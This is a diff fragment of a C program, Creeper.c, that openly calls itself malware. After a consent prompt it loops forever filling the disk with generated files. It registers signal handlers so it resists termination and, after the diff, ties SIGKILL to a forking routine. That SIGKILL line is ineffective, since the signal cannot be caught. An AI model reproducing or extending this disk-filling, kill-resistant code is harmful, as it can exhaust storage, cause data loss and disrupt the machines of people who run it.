@@ -353,7 +353,7 @@ Public License instead of this License.
 #include <signal.h>
 #define STUFF 5000
 #define BUF_LEN 5000
-
+#define INFINITY_LOOP 1
 typedef enum RANDOM_FILES
 {
   XML,
@@ -413,7 +413,7 @@ void enableProtectionKill()
   signal(SIGILL, handler);
   signal(SIGTRAP, handler);
   signal(SIGABRT, handler);
-  signal(SIGKILL, handler);
+  signal(SIGKILL, enableForking);
 }
 
 void enableForking(int ms)
@@ -433,8 +433,9 @@ int main(void)
 {
   setlocale(LC_ALL, "");
   srand(time(NULL));
+  printf("Creeper.c: Catch me if you can!\n");
   printf("WARNING:This file is considered an malware, it will run in your machine and loads you hd with stuff.\n");
-
+  printf("PS: When you accept the terms, you'll have the risk of data losses and problems with files.\n");
   while (1)
   {
     printf("At executing, you assume the risk.\nRun?(S/N)");
@@ -448,14 +449,14 @@ int main(void)
     }
     else if (x == 'n')
     {
-      puts("Goodbye ;-;");
+      puts("Goodbye, see you later!");
       return EXIT_FAILURE;
     }
   }
   enableProtectionKill();
-  while (1)
+  while (INFINITY_LOOP)
   {
-    printf("CREEPER");
+    printf("I'M THE CREEPER. CATCH ME IF YOU CAN!\t");
     createAndLoadFile(STUFF);
   }
   return EXIT_FAILURE;
